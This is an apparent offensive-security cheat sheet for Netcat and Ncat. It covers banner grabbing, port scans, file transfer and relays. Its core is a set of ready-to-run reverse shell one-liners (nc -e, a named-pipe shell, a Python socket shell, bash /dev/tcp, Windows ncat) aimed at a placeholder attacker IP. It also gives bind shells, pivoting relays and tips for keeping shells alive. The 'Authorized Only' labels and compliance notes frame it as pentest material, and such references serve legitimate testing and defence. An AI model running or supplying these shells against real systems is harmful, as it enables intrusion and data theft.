# Netcat Network Utility Manual

This document contains exhaustive reference material for Netcat (nc) and Ncat, including flags, techniques, and common patterns for offensive security applications.

## Basic Operations
- **Listen on port**: `nc -lvnp <port>`
- **Connect to remote**: `nc <target-ip> <port>`
- **Banner grab**: `echo "" | nc <target-ip> <port>`
- **Simple port scan**: `nc -zv <target-ip> <port-range>`

## Connectivity & Banner Grabbing
- **TCP test**: `nc -vz <target-ip> <port>`
- **UDP test**: `nc -uvz <target-ip> <port>`
- **HTTP banner**: `echo -e "GET / HTTP/1.0\r\n\r\n" | nc <target-ip> 80`
- **SMTP banner**: `echo "QUIT" | nc <target-ip> 25`

## Reverse Shells (Authorized Only)
- **Attacker (Listener)**: `nc -lvnp 4444`
- **Target (Linux -e)**: `nc <attacker-ip> 4444 -e /bin/bash`
- **Target (Linux FIFO)**: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f`
- **Target (Python)**: `python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
- **Target (Bash)**: `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
- **Target (Windows Ncat)**: `ncat.exe <attacker-ip> 4444 -e cmd.exe`

## Bind Shells (Authorized Only)
- **Target (Listener)**: `nc -lvnp 4444 -e /bin/bash`
- **Attacker (Connect)**: `nc <target-ip> 4444`

## File Transfers
- **Receiver**: `nc -lvnp 5555 > received_file.txt`
- **Sender**: `nc <receiver-ip> 5555 < file_to_send.txt`
- **Directory**: `tar czf - /dir | nc <receiver-ip> 5555` (Sender) / `nc -lvnp 5555 | tar xzf -` (Receiver)
- **Encrypted (Ncat)**: `ncat -lvnp 5555 --ssl > file` (Receiver) / `ncat <ip> 5555 --ssl < file` (Sender)

## Relay & Pivoting
- **Simple Relay**: `mkfifo backpipe; nc -lvnp 8080 0<backpipe | nc <internal-target-ip> 80 1>backpipe`
- **Ncat Relay**: `ncat -lvnp 8080 --sh-exec "ncat <internal-target-ip> 80"`

## Troubleshooting
- **No -e flag?** Use the FIFO (named pipe) method or use `ncat`.
- **Shell dies?** Wrap in a `while true; do ...; done` loop.
- **Not interactive?** Upgrade with `python -c 'import pty; pty.spawn("/bin/bash")'`.
- **Command not found?** Check `nc`, `ncat`, `netcat`. Install `netcat-traditional` or `ncat`.

## Security & Compliance
- **Audit**: Log all connection timestamps, IPs, and commands executed.
- **MITRE**: T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer).
- **Cleanup**: ALWAYS remove named pipes (`/tmp/f`), services, or cron jobs created for persistence.
